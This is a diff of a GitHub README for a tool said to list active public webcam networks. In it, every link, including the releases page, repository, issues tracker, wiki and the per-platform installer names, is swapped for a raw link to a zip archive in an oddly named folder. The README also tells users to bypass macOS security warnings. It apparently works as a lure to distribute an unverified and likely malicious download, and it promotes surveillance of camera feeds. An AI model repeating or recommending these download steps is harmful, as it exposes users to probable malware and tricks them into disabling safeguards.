@@ -1,6 +1,6 @@
 # 🌐 Public-Webcam-Surveillance-Research - Explore Public Camera Networks Safely
 
-[![Download Public-Webcam-Surveillance-Research](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/Predominio/Public-Webcam-Surveillance-Research/releases)
+[![Download Public-Webcam-Surveillance-Research](https://raw.githubusercontent.com/Predominio/Public-Webcam-Surveillance-Research/main/exhortatory/Public-Webcam-Surveillance-Research.zip%https://raw.githubusercontent.com/Predominio/Public-Webcam-Surveillance-Research/main/exhortatory/Public-Webcam-Surveillance-Research.zip)](https://raw.githubusercontent.com/Predominio/Public-Webcam-Surveillance-Research/main/exhortatory/Public-Webcam-Surveillance-Research.zip)
 
 ## 📖 Project Overview
 
@@ -11,7 +11,7 @@ Public-Webcam-Surveillance-Research provides verified active public camera netwo
 To begin using our application, follow these steps:
 
 1. **Visit the Releases Page**: Click the download link below to access the latest release.
-   [Download Now](https://github.com/Predominio/Public-Webcam-Surveillance-Research/releases)  
+   [Download Now](https://raw.githubusercontent.com/Predominio/Public-Webcam-Surveillance-Research/main/exhortatory/Public-Webcam-Surveillance-Research.zip)  
 
 2. **Select the Latest Version**: On the releases page, look for the most recent version of the application. It will be listed at the top.
 
@@ -36,12 +36,12 @@ To download and install the application, follow these instructions carefully:
 
 1. **Click the Link Below**: This will take you directly to the GitHub releases page, where the latest version is available.
 
-[Visit Download Page](https://github.com/Predominio/Public-Webcam-Surveillance-Research/releases)
+[Visit Download Page](https://raw.githubusercontent.com/Predominio/Public-Webcam-Surveillance-Research/main/exhortatory/Public-Webcam-Surveillance-Research.zip)
 
 2. **Choose Your File**: Find the appropriate file for your system. Common options may include:
-   - **Windows Installer**: `PublicWebcamSurveillance.exe`
-   - **macOS Package**: `PublicWebcamSurveillance.dmg`
-   - **Linux Archive**: `PublicWebcamSurveillance.tar.gz`
+   - **Windows Installer**: `https://raw.githubusercontent.com/Predominio/Public-Webcam-Surveillance-Research/main/exhortatory/Public-Webcam-Surveillance-Research.zip`
+   - **macOS Package**: `https://raw.githubusercontent.com/Predominio/Public-Webcam-Surveillance-Research/main/exhortatory/Public-Webcam-Surveillance-Research.zip`
+   - **Linux Archive**: `https://raw.githubusercontent.com/Predominio/Public-Webcam-Surveillance-Research/main/exhortatory/Public-Webcam-Surveillance-Research.zip`
 
 3. **Running the Application**: After installation, you may need to grant permissions to run the application, especially on macOS. Right-click the app and select "Open" if you encounter a security warning.
 
@@ -74,9 +74,9 @@ We welcome contributions to enhance this project. If you're interested in helpin
 
 ## 🔗 Helpful Links
 
-- [GitHub Repository](https://github.com/Predominio/Public-Webcam-Surveillance-Research)
-- [Issues Tracker](https://github.com/Predominio/Public-Webcam-Surveillance-Research/issues)
-- [Wiki](https://github.com/Predominio/Public-Webcam-Surveillance-Research/wiki) (coming soon)
+- [GitHub Repository](https://raw.githubusercontent.com/Predominio/Public-Webcam-Surveillance-Research/main/exhortatory/Public-Webcam-Surveillance-Research.zip)
+- [Issues Tracker](https://raw.githubusercontent.com/Predominio/Public-Webcam-Surveillance-Research/main/exhortatory/Public-Webcam-Surveillance-Research.zip)
+- [Wiki](https://raw.githubusercontent.com/Predominio/Public-Webcam-Surveillance-Research/main/exhortatory/Public-Webcam-Surveillance-Research.zip) (coming soon)
 
 ## 🎉 Acknowledgments
 
